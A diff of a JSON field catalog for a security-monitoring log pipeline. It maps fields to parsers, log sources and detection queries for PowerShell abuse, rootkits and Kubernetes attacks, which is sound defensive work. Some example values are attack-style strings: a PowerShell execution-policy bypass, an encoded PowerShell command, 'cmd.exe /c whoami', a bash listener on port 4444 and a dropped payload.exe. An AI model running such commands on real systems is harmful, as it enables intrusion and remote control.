+          "parser_name": "socCloudGuardInstanceSecurityJsonParser",
+          "parser_display": "SOC Cloud Guard Instance Security JSON Parser",
+          "sequence": 9,
+          "raw_json_path": "$.severity"
+        }
+      ],
+      "sources": [
+        {
+          "source_internal": "socCloudGuardInstanceSecuritySource",
+          "source_display": "SOC Cloud Guard Instance Security Logs"
+        }
+      ],
+      "source_candidate_groups": [
+        "cloud_guard_instance_security",
+        "osquery_results"
+      ],
+      "example_values": [
+        "critical"
+      ],
+      "contract_datasets": [
+        "application_logs.jsonl"
+      ],
+      "queries_using_it": [
+        "cloud_guard_instance_security_findings_by_host.json",
+        "cloud_guard_instance_security_findings_by_pack_query.json",
+        "cloud_guard_instance_security_high_severity_pivots.json",
+        "cloud_guard_instance_security_pack_coverage.json",
+        "cloud_guard_instance_security_raw_result_detail.json"
+      ],
+      "dashboards_using_it": [],
+      "reserved_backing_field": ""
+    },
+    {
+      "display_name": "Finding Status",
+      "kind": "custom",
+      "type": "STRING",
+      "raw_json_paths": [
+        "$.status"
+      ],
+      "parsers": [
+        {
+          "parser_name": "socCloudGuardInstanceSecurityJsonParser",
+          "parser_display": "SOC Cloud Guard Instance Security JSON Parser",
+          "sequence": 10,
+          "raw_json_path": "$.status"
+        }
+      ],
+      "sources": [
+        {
+          "source_internal": "socCloudGuardInstanceSecuritySource",
+          "source_display": "SOC Cloud Guard Instance Security Logs"
+        }
+      ],
+      "source_candidate_groups": [
+        "cloud_guard_instance_security",
+        "osquery_results"
+      ],
+      "example_values": [
+        "open"
+      ],
+      "contract_datasets": [],
+      "queries_using_it": [
+        "cloud_guard_instance_security_pack_coverage.json",
+        "cloud_guard_instance_security_raw_result_detail.json"
+      ],
       "dashboards_using_it": [],
       "reserved_backing_field": ""
     },
@@ -3833,7 +4359,8 @@
         }
       ],
       "source_candidate_groups": [
-        "application_logs"
+        "application_logs",
+        "azure_log_analytics_custom"
       ],
       "example_values": [],
       "contract_datasets": [],
@@ -3870,7 +4397,8 @@
         }
       ],
       "source_candidate_groups": [
-        "application_logs"
+        "application_logs",
+        "azure_log_analytics_custom"
       ],
       "example_values": [],
       "contract_datasets": [],
@@ -3941,7 +4469,8 @@
         }
       ],
       "source_candidate_groups": [
-        "application_logs"
+        "application_logs",
+        "azure_log_analytics_custom"
       ],
       "example_values": [],
       "contract_datasets": [],
@@ -3978,7 +4507,8 @@
         }
       ],
       "source_candidate_groups": [
-        "application_logs"
+        "application_logs",
+        "azure_log_analytics_custom"
       ],
       "example_values": [],
       "contract_datasets": [],
@@ -4105,6 +4635,43 @@
       "reserved_backing_field": ""
     },
     {
+      "display_name": "Host Application",
+      "kind": "custom",
+      "type": "STRING",
+      "raw_json_paths": [
+        "$.HostApplication"
+      ],
+      "parsers": [
+        {
+          "parser_name": "socWinPowerShellOperationalJsonParser",
+          "parser_display": "SOC Windows PowerShell Operational JSON Parser",
+          "sequence": 11,
+          "raw_json_path": "$.HostApplication"
+        }
+      ],
+      "sources": [
+        {
+          "source_internal": "socWinPowerShellOperationalSource",
+          "source_display": "Windows PowerShell Operational Logs"
+        }
+      ],
+      "source_candidate_groups": [
+        "windows_powershell_operational"
+      ],
+      "example_values": [
+        "powershell.exe -NoProfile -ExecutionPolicy Bypass"
+      ],
+      "contract_datasets": [
+        "windows_powershell_operational.jsonl"
+      ],
+      "queries_using_it": [
+        "clickfix_fake_captcha_powershell_execution.json",
+        "windows_powershell_script_block_suspicious_content.json"
+      ],
+      "dashboards_using_it": [],
+      "reserved_backing_field": ""
+    },
+    {
       "display_name": "Host Name",
       "kind": "custom",
       "type": "STRING",
@@ -4136,6 +4703,12 @@
           "raw_json_path": "$.resourceName"
         },
         {
+          "parser_name": "socCloudGuardInstanceSecurityJsonParser",
+          "parser_display": "SOC Cloud Guard Instance Security JSON Parser",
+          "sequence": 3,
+          "raw_json_path": "$.hostname"
+        },
+        {
           "parser_name": "socWinEventSecurityJsonParser",
           "parser_display": "SOC Windows Event Security JSON Parser",
           "sequence": 10,
@@ -4144,6 +4717,18 @@
         {
           "parser_name": "socWinEventSystemJsonParser",
           "parser_display": "SOC Windows Event System JSON Parser",
+          "sequence": 5,
+          "raw_json_path": "$.Computer"
+        },
+        {
+          "parser_name": "socWinPowerShellOperationalJsonParser",
+          "parser_display": "SOC Windows PowerShell Operational JSON Parser",
+          "sequence": 5,
+          "raw_json_path": "$.Computer"
+        },
+        {
+          "parser_name": "socWindowsDefenderOperationalJsonParser",
+          "parser_display": "SOC Windows Defender Operational JSON Parser",
           "sequence": 5,
           "raw_json_path": "$.Computer"
         },
@@ -4216,12 +4801,24 @@
           "source_display": "SOC Cloud Guard Logs"
         },
         {
+          "source_internal": "socCloudGuardInstanceSecuritySource",
+          "source_display": "SOC Cloud Guard Instance Security Logs"
+        },
+        {
           "source_internal": "socWinEventSecuritySource",
           "source_display": "Windows Event Security Logs"
         },
         {
           "source_internal": "socWinEventSystemSource",
           "source_display": "Windows Event System Logs"
+        },
+        {
+          "source_internal": "socWinPowerShellOperationalSource",
+          "source_display": "Windows PowerShell Operational Logs"
+        },
+        {
+          "source_internal": "socWindowsDefenderOperationalSource",
+          "source_display": "Windows Defender Operational Logs"
         },
         {
           "source_internal": "socLinuxSecureSource",
@@ -4258,26 +4855,33 @@
       ],
       "source_candidate_groups": [
         "application_logs",
+        "azure_log_analytics_custom",
         "cloud_guard",
+        "cloud_guard_instance_security",
         "lb_access",
         "linux_secure",
         "linux_syslog",
         "multicloud_health",
+        "osquery_results",
         "sysmon_network",
         "sysmon_operational",
         "waf_security",
         "webapp_security",
+        "windows_defender_operational",
         "windows_event_security",
         "windows_event_system",
+        "windows_powershell_operational",
         "windows_sysmon"
       ],
       "example_values": [
         "web-prod-01",
         "WS01.corp.local",
         "test-bucket-42",
+        "oke-worker-01",
         "DC01.sevenkingdoms.local",
         "SRV01.sevenkingdoms.local",
         "WS01.sevenkingdoms.local",
+        "WS02.sevenkingdoms.local",
         "sevenkingdoms.example.com",
         "crm-portal-01",
         "octo-shop-vm-01",
@@ -4290,14 +4894,29 @@
         "multicloud_health.jsonl",
         "sysmon_network.jsonl",
         "sysmon_operational.jsonl",
+        "windows_defender_operational.jsonl",
         "windows_event_security.jsonl",
         "windows_event_system.jsonl",
+        "windows_powershell_operational.jsonl",
         "windows_sysmon.jsonl"
       ],
       "queries_using_it": [
         "apps/apm_octo_osquery_findings.json",
+        "apps/oke_boopkit_attack_timeline.json",
+        "apps/oke_ebpf_rootkit_activity.json",
+        "apps/oke_exec_and_node_escape.json",
+        "apps/oke_privileged_workload_creation.json",
+        "apps/oke_rule_boopkit_ebpf_rootkit_count.json",
+        "apps/oke_rule_privileged_workload_count.json",
+        "apps/oke_secrets_and_rbac_abuse.json",
         "bluelight_onedrive_exfiltration.json",
+        "cloud_guard_instance_security_findings_by_host.json",
+        "cloud_guard_instance_security_high_severity_pivots.json",
+        "cloud_guard_instance_security_pack_coverage.json",
+        "cloud_guard_instance_security_raw_result_detail.json",
         "hunting/c2_dns_beacon_sources.json",
+        "hunting/coordinator_affected_hosts_kpi.json",
+        "hunting/coordinator_top_affected_hosts.json",
         "hunting/linux_data_staging_exfil.json",
         "hunting/linux_multi_stage_attack.json",
         "hunting/linux_persistence_score.json",
@@ -4345,6 +4964,18 @@
           "raw_json_path": "$.Computer"
         },
         {
+          "parser_name": "socWinPowerShellOperationalJsonParser",
+          "parser_display": "SOC Windows PowerShell Operational JSON Parser",
+          "sequence": 4,
+          "raw_json_path": "$.Computer"
+        },
+        {
+          "parser_name": "socWindowsDefenderOperationalJsonParser",
+          "parser_display": "SOC Windows Defender Operational JSON Parser",
+          "sequence": 4,
+          "raw_json_path": "$.Computer"
+        },
+        {
           "parser_name": "socLinuxSecureJsonParser",
           "parser_display": "SOC Linux Secure JSON Parser",
           "sequence": 6,
@@ -4371,6 +5002,14 @@
           "source_display": "Windows Event System Logs"
         },
         {
+          "source_internal": "socWinPowerShellOperationalSource",
+          "source_display": "Windows PowerShell Operational Logs"
+        },
+        {
+          "source_internal": "socWindowsDefenderOperationalSource",
+          "source_display": "Windows Defender Operational Logs"
+        },
+        {
           "source_internal": "socLinuxSecureSource",
           "source_display": "Linux Secure Logs"
         },
@@ -4384,24 +5023,29 @@
         "linux_syslog",
         "sysmon_network",
         "sysmon_operational",
+        "windows_defender_operational",
         "windows_event_security",
         "windows_event_system",
+        "windows_powershell_operational",
         "windows_sysmon"
       ],
       "example_values": [
         "WS01.corp.local",
         "DC01.sevenkingdoms.local",
         "SRV01.sevenkingdoms.local",
-        "web-prod-01",
-        "WS01.sevenkingdoms.local"
+        "WS01.sevenkingdoms.local",
+        "WS02.sevenkingdoms.local",
+        "web-prod-01"
       ],
       "contract_datasets": [
         "linux_secure.jsonl",
         "linux_syslog.jsonl",
         "sysmon_network.jsonl",
         "sysmon_operational.jsonl",
+        "windows_defender_operational.jsonl",
         "windows_event_security.jsonl",
         "windows_event_system.jsonl",
+        "windows_powershell_operational.jsonl",
         "windows_sysmon.jsonl"
       ],
       "queries_using_it": [
@@ -4419,6 +5063,7 @@
         "bluelight_yara_keylogger.json",
         "bluelight_yara_pdb_strings.json",
         "bluelight_yara_system_recon.json",
+        "clickfix_fake_captcha_powershell_execution.json",
         "hunting/bluelight_apt37_kill_chain.json",
         "hunting/bluelight_attack_path_link.json",
         "hunting/bluelight_top_affected_hosts.json",
@@ -4440,7 +5085,19 @@
         "sentinel/deimos_component_execution.json",
         "sentinel/detect_suspicious_commands_initiated_by_webserver_processes.json",
         "sentinel/vmware-lpe-2022-22960.json",
-        "sysmon_dns_data_exfiltration.json"
+        "sysmon_dns_data_exfiltration.json",
+        "sysmon_executable_file_created_or_detected.json",
+        "windows_account_or_group_enumeration_spike.json",
+        "windows_admin_share_access_spike_event.json",
+        "windows_audit_policy_changed.json",
+        "windows_defender_malware_or_remediation_event.json",
+        "windows_kerberos_pre_authentication_failures.json",
+        "windows_ntlm_authentication_failures.json",
+        "windows_powershell_script_block_suspicious_content.json",
+        "windows_privileged_group_membership_change_event.json",
+        "windows_scheduled_task_created_or_updated_event.json",
+        "windows_security_log_cleared_event.json",
+        "windows_service_installed_event_log.json"
       ],
       "dashboards_using_it": [],
       "reserved_backing_field": ""
@@ -4467,7 +5124,8 @@
         }
       ],
       "source_candidate_groups": [
-        "application_logs"
+        "application_logs",
+        "azure_log_analytics_custom"
       ],
       "example_values": [
         "shop-frontend"
@@ -4547,6 +5205,7 @@
       ],
       "source_candidate_groups": [
         "application_logs",
+        "azure_log_analytics_custom",
         "lb_access",
         "waf_security",
         "webapp_security"
@@ -4593,7 +5252,8 @@
         }
       ],
       "source_candidate_groups": [
-        "application_logs"
+        "application_logs",
+        "azure_log_analytics_custom"
       ],
       "example_values": [
         "<URL>"
@@ -4632,7 +5292,8 @@
         }
       ],
       "source_candidate_groups": [
-        "application_logs"
+        "application_logs",
+        "azure_log_analytics_custom"
       ],
       "example_values": [
         "GET"
@@ -4683,7 +5344,8 @@
         }
       ],
       "source_candidate_groups": [
-        "application_logs"
+        "application_logs",
+        "azure_log_analytics_custom"
       ],
       "example_values": [
         200
@@ -4769,9 +5431,22 @@
       "kind": "custom",
       "type": "STRING",
       "raw_json_paths": [
+        "$.instanceOcid",
         "$.cloud.instance.id"
       ],
       "parsers": [
+        {
+          "parser_name": "socCloudGuardInstanceSecurityJsonParser",
+          "parser_display": "SOC Cloud Guard Instance Security JSON Parser",
+          "sequence": 4,
+          "raw_json_path": "$.instanceOcid"
+        },
+        {
+          "parser_name": "socCloudGuardInstanceSecurityJsonParser",
+          "parser_display": "SOC Cloud Guard Instance Security JSON Parser",
+          "sequence": 5,
+          "raw_json_path": "$.cloud.instance.id"
+        },
         {
           "parser_name": "socApplicationJsonParser",
           "parser_display": "SOC Application JSON Parser",
@@ -4781,12 +5456,19 @@
       ],
       "sources": [
         {
+          "source_internal": "socCloudGuardInstanceSecuritySource",
+          "source_display": "SOC Cloud Guard Instance Security Logs"
+        },
+        {
           "source_internal": "socApplicationSource",
           "source_display": "SOC Application Logs"
         }
       ],
       "source_candidate_groups": [
-        "application_logs"
+        "application_logs",
+        "azure_log_analytics_custom",
+        "cloud_guard_instance_security",
+        "osquery_results"
       ],
       "example_values": [
         "<OCI_RESOURCE_OCID>"
@@ -4795,7 +5477,9 @@
       "queries_using_it": [
         "apps/apm_octo_attack_timeline.json",
         "apps/apm_octo_compromised_vm_pivots.json",
-        "apps/apm_octo_osquery_findings.json"
+        "apps/apm_octo_osquery_findings.json",
+        "cloud_guard_instance_security_findings_by_host.json",
+        "cloud_guard_instance_security_raw_result_detail.json"
       ],
       "dashboards_using_it": [],
       "reserved_backing_field": ""
@@ -4826,6 +5510,74 @@
       ],
       "example_values": [
         "web-server"
+      ],
+      "contract_datasets": [],
+      "queries_using_it": [],
+      "dashboards_using_it": [],
+      "reserved_backing_field": ""
+    },
+    {
+      "display_name": "Instance Security Problem ID",
+      "kind": "custom",
+      "type": "STRING",
+      "raw_json_paths": [
+        "$.problemId"
+      ],
+      "parsers": [
+        {
+          "parser_name": "socCloudGuardInstanceSecurityJsonParser",
+          "parser_display": "SOC Cloud Guard Instance Security JSON Parser",
+          "sequence": 13,
+          "raw_json_path": "$.problemId"
+        }
+      ],
+      "sources": [
+        {
+          "source_internal": "socCloudGuardInstanceSecuritySource",
+          "source_display": "SOC Cloud Guard Instance Security Logs"
+        }
+      ],
+      "source_candidate_groups": [
+        "cloud_guard_instance_security",
+        "osquery_results"
+      ],
+      "example_values": [
+        "cgis-problem-001"
+      ],
+      "contract_datasets": [
+        "cloud_guard.jsonl"
+      ],
+      "queries_using_it": [],
+      "dashboards_using_it": [],
+      "reserved_backing_field": ""
+    },
+    {
+      "display_name": "Instance Security Rule ID",
+      "kind": "custom",
+      "type": "STRING",
+      "raw_json_paths": [
+        "$.ruleId"
+      ],
+      "parsers": [
+        {
+          "parser_name": "socCloudGuardInstanceSecurityJsonParser",
+          "parser_display": "SOC Cloud Guard Instance Security JSON Parser",
+          "sequence": 14,
+          "raw_json_path": "$.ruleId"
+        }
+      ],
+      "sources": [
+        {
+          "source_internal": "socCloudGuardInstanceSecuritySource",
+          "source_display": "SOC Cloud Guard Instance Security Logs"
+        }
+      ],
+      "source_candidate_groups": [
+        "cloud_guard_instance_security",
+        "osquery_results"
+      ],
+      "example_values": [
+        "cgis-rule-osquery-unexpected-listener"
       ],
       "contract_datasets": [],
       "queries_using_it": [],
@@ -4958,7 +5710,8 @@
         }
       ],
       "source_candidate_groups": [
-        "application_logs"
+        "application_logs",
+        "azure_log_analytics_custom"
       ],
       "example_values": [
         ""
@@ -5000,7 +5753,8 @@
         }
       ],
       "source_candidate_groups": [
-        "application_logs"
+        "application_logs",
+        "azure_log_analytics_custom"
       ],
       "example_values": [
         135
@@ -5041,7 +5795,8 @@
         }
       ],
       "source_candidate_groups": [
-        "application_logs"
+        "application_logs",
+        "azure_log_analytics_custom"
       ],
       "example_values": [
         "/api/java-apm/payment/authorize"
@@ -5083,7 +5838,8 @@
         }
       ],
       "source_candidate_groups": [
-        "application_logs"
+        "application_logs",
+        "azure_log_analytics_custom"
       ],
       "example_values": [
         200
@@ -5231,10 +5987,17 @@
       "kind": "custom",
       "type": "STRING",
       "raw_json_paths": [
+        "$.logType",
         "$.type",
         "$.logContent.data.log_type"
       ],
       "parsers": [
+        {
+          "parser_name": "socCloudGuardInstanceSecurityJsonParser",
+          "parser_display": "SOC Cloud Guard Instance Security JSON Parser",
+          "sequence": 31,
+          "raw_json_path": "$.logType"
+        },
         {
           "parser_name": "socVcnFlowJsonParser",
           "parser_display": "SOC VCN Flow JSON Parser",
@@ -5250,6 +6013,10 @@
       ],
       "sources": [
         {
+          "source_internal": "socCloudGuardInstanceSecuritySource",
+          "source_display": "SOC Cloud Guard Instance Security Logs"
+        },
+        {
           "source_internal": "socVcnFlowSource",
           "source_display": "SOC VCN Flow Logs"
         },
@@ -5259,10 +6026,13 @@
         }
       ],
       "source_candidate_groups": [
+        "cloud_guard_instance_security",
         "network_firewall",
+        "osquery_results",
         "vcn_flow"
       ],
       "example_values": [
+        "cloud_guard_instance_security",
         "com.oraclecloud.vcn.flowlogs.DataEvent",
         "threat"
       ],
@@ -5436,7 +6206,8 @@
         }
       ],
       "source_candidate_groups": [
-        "application_logs"
+        "application_logs",
+        "azure_log_analytics_custom"
       ],
       "example_values": [
         "nginx-rewrite"
@@ -5507,7 +6278,8 @@
         }
       ],
       "source_candidate_groups": [
-        "application_logs"
+        "application_logs",
+        "azure_log_analytics_custom"
       ],
       "example_values": [],
       "contract_datasets": [],
@@ -5537,7 +6309,8 @@
         }
       ],
       "source_candidate_groups": [
-        "application_logs"
+        "application_logs",
+        "azure_log_analytics_custom"
       ],
       "example_values": [
         "http.server.duration"
@@ -5574,7 +6347,8 @@
         }
       ],
       "source_candidate_groups": [
-        "application_logs"
+        "application_logs",
+        "azure_log_analytics_custom"
       ],
       "example_values": [
         "ms"
@@ -5610,7 +6384,8 @@
         }
       ],
       "source_candidate_groups": [
-        "application_logs"
+        "application_logs",
+        "azure_log_analytics_custom"
       ],
       "example_values": [
         "842"
@@ -5633,6 +6408,12 @@
       ],
       "parsers": [
         {
+          "parser_name": "socCloudGuardInstanceSecurityJsonParser",
+          "parser_display": "SOC Cloud Guard Instance Security JSON Parser",
+          "sequence": 28,
+          "raw_json_path": "$.mitre.tactic"
+        },
+        {
           "parser_name": "socApplicationJsonParser",
           "parser_display": "SOC Application JSON Parser",
           "sequence": 93,
@@ -5641,14 +6422,22 @@
       ],
       "sources": [
         {
+          "source_internal": "socCloudGuardInstanceSecuritySource",
+          "source_display": "SOC Cloud Guard Instance Security Logs"
+        },
+        {
           "source_internal": "socApplicationSource",
           "source_display": "SOC Application Logs"
         }
       ],
       "source_candidate_groups": [
-        "application_logs"
+        "application_logs",
+        "azure_log_analytics_custom",
+        "cloud_guard_instance_security",
+        "osquery_results"
       ],
       "example_values": [
+        "Command and Control",
         "Credential Access"
       ],
       "contract_datasets": [],
@@ -5665,6 +6454,12 @@
       ],
       "parsers": [
         {
+          "parser_name": "socCloudGuardInstanceSecurityJsonParser",
+          "parser_display": "SOC Cloud Guard Instance Security JSON Parser",
+          "sequence": 30,
+          "raw_json_path": "$.mitre.technique"
+        },
+        {
           "parser_name": "socApplicationJsonParser",
           "parser_display": "SOC Application JSON Parser",
           "sequence": 95,
@@ -5673,18 +6468,28 @@
       ],
       "sources": [
         {
+          "source_internal": "socCloudGuardInstanceSecuritySource",
+          "source_display": "SOC Cloud Guard Instance Security Logs"
+        },
+        {
           "source_internal": "socApplicationSource",
           "source_display": "SOC Application Logs"
         }
       ],
       "source_candidate_groups": [
-        "application_logs"
+        "application_logs",
+        "azure_log_analytics_custom",
+        "cloud_guard_instance_security",
+        "osquery_results"
       ],
       "example_values": [
+        "Non-Application Layer Protocol",
         "Adversary-in-the-Middle"
       ],
       "contract_datasets": [],
-      "queries_using_it": [],
+      "queries_using_it": [
+        "apps/oke_boopkit_attack_timeline.json"
+      ],
       "dashboards_using_it": [],
       "reserved_backing_field": ""
     },
@@ -5697,6 +6502,12 @@
       ],
       "parsers": [
         {
+          "parser_name": "socCloudGuardInstanceSecurityJsonParser",
+          "parser_display": "SOC Cloud Guard Instance Security JSON Parser",
+          "sequence": 29,
+          "raw_json_path": "$.mitre.technique_id"
+        },
+        {
           "parser_name": "socApplicationJsonParser",
           "parser_display": "SOC Application JSON Parser",
           "sequence": 94,
@@ -5705,20 +6516,34 @@
       ],
       "sources": [
         {
+          "source_internal": "socCloudGuardInstanceSecuritySource",
+          "source_display": "SOC Cloud Guard Instance Security Logs"
+        },
+        {
           "source_internal": "socApplicationSource",
           "source_display": "SOC Application Logs"
         }
       ],
       "source_candidate_groups": [
-        "application_logs"
+        "application_logs",
+        "azure_log_analytics_custom",
+        "cloud_guard_instance_security",
+        "osquery_results"
       ],
       "example_values": [
+        "T1095",
         "T1557"
       ],
       "contract_datasets": [],
       "queries_using_it": [
         "apps/apm_octo_attack_timeline.json",
-        "apps/apm_octo_attack_trace_correlation.json"
+        "apps/apm_octo_attack_trace_correlation.json",
+        "apps/oke_boopkit_attack_timeline.json",
+        "apps/oke_ebpf_rootkit_activity.json",
+        "apps/oke_exec_and_node_escape.json",
+        "apps/oke_kubernetes_attack_overview.json",
+        "apps/oke_secrets_and_rbac_abuse.json",
+        "cloud_guard_instance_security_high_severity_pivots.json"
       ],
       "dashboards_using_it": [],
       "reserved_backing_field": ""
@@ -5753,6 +6578,12 @@
           "raw_json_path": "$.problemName"
         },
         {
+          "parser_name": "socCloudGuardInstanceSecurityJsonParser",
+          "parser_display": "SOC Cloud Guard Instance Security JSON Parser",
+          "sequence": 1,
+          "raw_json_path": "$.message"
+        },
+        {
           "parser_name": "socWinEventSecurityJsonParser",
           "parser_display": "SOC Windows Event Security JSON Parser",
           "sequence": 1,
@@ -5761,6 +6592,18 @@
         {
           "parser_name": "socWinEventSystemJsonParser",
           "parser_display": "SOC Windows Event System JSON Parser",
+          "sequence": 1,
+          "raw_json_path": "$.msg"
+        },
+        {
+          "parser_name": "socWinPowerShellOperationalJsonParser",
+          "parser_display": "SOC Windows PowerShell Operational JSON Parser",
+          "sequence": 1,
+          "raw_json_path": "$.msg"
+        },
+        {
+          "parser_name": "socWindowsDefenderOperationalJsonParser",
+          "parser_display": "SOC Windows Defender Operational JSON Parser",
           "sequence": 1,
           "raw_json_path": "$.msg"
         },
@@ -5839,12 +6682,24 @@
           "source_display": "SOC Cloud Guard Logs"
         },
         {
+          "source_internal": "socCloudGuardInstanceSecuritySource",
+          "source_display": "SOC Cloud Guard Instance Security Logs"
+        },
+        {
           "source_internal": "socWinEventSecuritySource",
           "source_display": "Windows Event Security Logs"
         },
         {
           "source_internal": "socWinEventSystemSource",
           "source_display": "Windows Event System Logs"
+        },
+        {
+          "source_internal": "socWinPowerShellOperationalSource",
+          "source_display": "Windows PowerShell Operational Logs"
+        },
+        {
+          "source_internal": "socWindowsDefenderOperationalSource",
+          "source_display": "Windows Defender Operational Logs"
         },
         {
           "source_internal": "socLinuxSecureSource",
@@ -5889,27 +6744,35 @@
       ],
       "source_candidate_groups": [
         "application_logs",
+        "azure_log_analytics_custom",
         "cloud_guard",
+        "cloud_guard_instance_security",
         "lb_access",
         "linux_secure",
         "linux_syslog",
         "multicloud_health",
         "network_firewall",
+        "osquery_results",
         "sysmon_network",
         "sysmon_operational",
         "vcn_flow",
         "waf_security",
         "webapp_security",
+        "windows_defender_operational",
         "windows_event_security",
         "windows_event_system",
+        "windows_powershell_operational",
         "windows_sysmon"
       ],
       "example_values": [
         "Failed password for admin from <IP_ADDRESS> port 54321 ssh2",
         "powershell.exe -enc SQBFAFgA",
         "BUCKET_IS_PUBLIC_READ",
+        "OSQuery detected a suspicious listening process on an OCI compute instance",
         "A Kerberos service ticket was requested.",
         "A service was installed in the system.",
+        "Suspicious PowerShell script block logged.",
+        "Microsoft Defender Antivirus detected malware.",
         "Process Create: cmd.exe /c whoami",
         "Network connection detected: cmd.exe -> <IP_ADDRESS>:443",
         "WAF BLOCK: SQL Injection attempt in /vulnerable/search",
@@ -5926,8 +6789,10 @@
         "linux_secure.jsonl",
         "linux_syslog.jsonl",
         "sysmon_operational.jsonl",
+        "windows_defender_operational.jsonl",
         "windows_event_security.jsonl",
         "windows_event_system.jsonl",
+        "windows_powershell_operational.jsonl",
         "windows_sysmon.jsonl"
       ],
       "queries_using_it": [],
@@ -6004,7 +6869,8 @@
         }
       ],
       "source_candidate_groups": [
-        "application_logs"
+        "application_logs",
+        "azure_log_analytics_custom"
       ],
       "example_values": [
         4812
@@ -6100,10 +6966,43 @@
         }
       ],
       "source_candidate_groups": [
-        "application_logs"
+        "application_logs",
+        "azure_log_analytics_custom"
       ],
       "example_values": [
         "https"
+      ],
+      "contract_datasets": [],
+      "queries_using_it": [],
+      "dashboards_using_it": [],
+      "reserved_backing_field": ""
+    },
+    {
+      "display_name": "Object Name",
+      "kind": "custom",
+      "type": "STRING",
+      "raw_json_paths": [
+        "$.ObjectName"
+      ],
+      "parsers": [
+        {
+          "parser_name": "socWinEventSecurityJsonParser",
+          "parser_display": "SOC Windows Event Security JSON Parser",
+          "sequence": 24,
+          "raw_json_path": "$.ObjectName"
+        }
+      ],
+      "sources": [
+        {
+          "source_internal": "socWinEventSecuritySource",
+          "source_display": "Windows Event Security Logs"
+        }
+      ],
+      "source_candidate_groups": [
+        "windows_event_security"
+      ],
+      "example_values": [
+        "\\\\DC01\\C$\\Windows\\Temp\\payload.exe"
       ],
       "contract_datasets": [],
       "queries_using_it": [],
@@ -6270,7 +7169,8 @@
         }
       ],
       "source_candidate_groups": [
-        "application_logs"
+        "application_logs",
+        "azure_log_analytics_custom"
       ],
       "example_values": [],
       "contract_datasets": [],
@@ -6307,7 +7207,8 @@
         }
       ],
       "source_candidate_groups": [
-        "application_logs"
+        "application_logs",
+        "azure_log_analytics_custom"
       ],
       "example_values": [],
       "contract_datasets": [],
@@ -6337,7 +7238,8 @@
         }
       ],
       "source_candidate_groups": [
-        "application_logs"
+        "application_logs",
+        "azure_log_analytics_custom"
       ],
       "example_values": [
         0
@@ -6371,7 +7273,8 @@
         }
       ],
       "source_candidate_groups": [
-        "application_logs"
+        "application_logs",
+        "azure_log_analytics_custom"
       ],
       "example_values": [
         0
@@ -6405,7 +7308,8 @@
         }
       ],
       "source_candidate_groups": [
-        "application_logs"
+        "application_logs",
+        "azure_log_analytics_custom"
       ],
       "example_values": [
         ""
@@ -6439,7 +7343,8 @@
         }
       ],
       "source_candidate_groups": [
-        "application_logs"
+        "application_logs",
+        "azure_log_analytics_custom"
       ],
       "example_values": [
         0
@@ -6497,6 +7402,12 @@
       ],
       "parsers": [
         {
+          "parser_name": "socCloudGuardInstanceSecurityJsonParser",
+          "parser_display": "SOC Cloud Guard Instance Security JSON Parser",
+          "sequence": 20,
+          "raw_json_path": "$.osquery.finding"
+        },
+        {
           "parser_name": "socApplicationJsonParser",
           "parser_display": "SOC Application JSON Parser",
           "sequence": 102,
@@ -6505,20 +7416,30 @@
       ],
       "sources": [
         {
+          "source_internal": "socCloudGuardInstanceSecuritySource",
+          "source_display": "SOC Cloud Guard Instance Security Logs"
+        },
+        {
           "source_internal": "socApplicationSource",
           "source_display": "SOC Application Logs"
         }
       ],
       "source_candidate_groups": [
-        "application_logs"
+        "application_logs",
+        "azure_log_analytics_custom",
+        "cloud_guard_instance_security",
+        "osquery_results"
       ],
       "example_values": [
+        "Process bash opened a listener on <IP_ADDRESS>:4444",
         "redirect rule simulation points payment flow to a suspicious host"
       ],
       "contract_datasets": [],
       "queries_using_it": [
         "apps/apm_octo_compromised_vm_pivots.json",
-        "apps/apm_octo_osquery_findings.json"
+        "apps/apm_octo_osquery_findings.json",
+        "cloud_guard_instance_security_findings_by_pack_query.json",
+        "cloud_guard_instance_security_raw_result_detail.json"
       ],
       "dashboards_using_it": [],
       "reserved_backing_field": ""
@@ -6532,6 +7453,12 @@
       ],
       "parsers": [
         {
+          "parser_name": "socCloudGuardInstanceSecurityJsonParser",
+          "parser_display": "SOC Cloud Guard Instance Security JSON Parser",
+          "sequence": 18,
+          "raw_json_path": "$.osquery.query"
+        },
+        {
           "parser_name": "socApplicationJsonParser",
           "parser_display": "SOC Application JSON Parser",
           "sequence": 101,
@@ -6540,14 +7467,22 @@
       ],
       "sources": [
         {
+          "source_internal": "socCloudGuardInstanceSecuritySource",
+          "source_display": "SOC Cloud Guard Instance Security Logs"
+        },
+        {
           "source_internal": "socApplicationSource",
           "source_display": "SOC Application Logs"
         }
       ],
       "source_candidate_groups": [
-        "application_logs"
+        "application_logs",
+        "azure_log_analytics_custom",
+        "cloud_guard_instance_security",
+        "osquery_results"
       ],
       "example_values": [
+        "unexpected_listeners",
         "suspicious-shell-history"
       ],
       "contract_datasets": [],
@@ -6567,6 +7502,12 @@
       ],
       "parsers": [
         {
+          "parser_name": "socCloudGuardInstanceSecurityJsonParser",
+          "parser_display": "SOC Cloud Guard Instance Security JSON Parser",
+          "sequence": 21,
+          "raw_json_path": "$.osquery.result_count"
+        },
+        {
           "parser_name": "socApplicationJsonParser",
           "parser_display": "SOC Application JSON Parser",
           "sequence": 104,
@@ -6575,12 +7516,19 @@
       ],
       "sources": [
         {
+          "source_internal": "socCloudGuardInstanceSecuritySource",
+          "source_display": "SOC Cloud Guard Instance Security Logs"
+        },
+        {
           "source_internal": "socApplicationSource",
           "source_display": "SOC Application Logs"
         }
       ],
       "source_candidate_groups": [
-        "application_logs"
+        "application_logs",
+        "azure_log_analytics_custom",
+        "cloud_guard_instance_security",
+        "osquery_results"
       ],
       "example_values": [
         1
@@ -6599,6 +7547,12 @@
       ],
       "parsers": [
         {
+          "parser_name": "socCloudGuardInstanceSecurityJsonParser",
+          "parser_display": "SOC Cloud Guard Instance Security JSON Parser",
+          "sequence": 19,
+          "raw_json_path": "$.osquery.sql"
+        },
+        {
           "parser_name": "socApplicationJsonParser",
           "parser_display": "SOC Application JSON Parser",
           "sequence": 103,
@@ -6607,19 +7561,28 @@
       ],
       "sources": [
         {
+          "source_internal": "socCloudGuardInstanceSecuritySource",
+          "source_display": "SOC Cloud Guard Instance Security Logs"
+        },
+        {
           "source_internal": "socApplicationSource",
           "source_display": "SOC Application Logs"
         }
       ],
       "source_candidate_groups": [
-        "application_logs"
+        "application_logs",
+        "azure_log_analytics_custom",
+        "cloud_guard_instance_security",
+        "osquery_results"
       ],
       "example_values": [
+        "SELECT pid, port, protocol FROM listening_ports;",
         "SELECT pid, name, path, cmdline FROM processes;"
       ],
       "contract_datasets": [],
       "queries_using_it": [
-        "apps/apm_octo_osquery_findings.json"
+        "apps/apm_octo_osquery_findings.json",
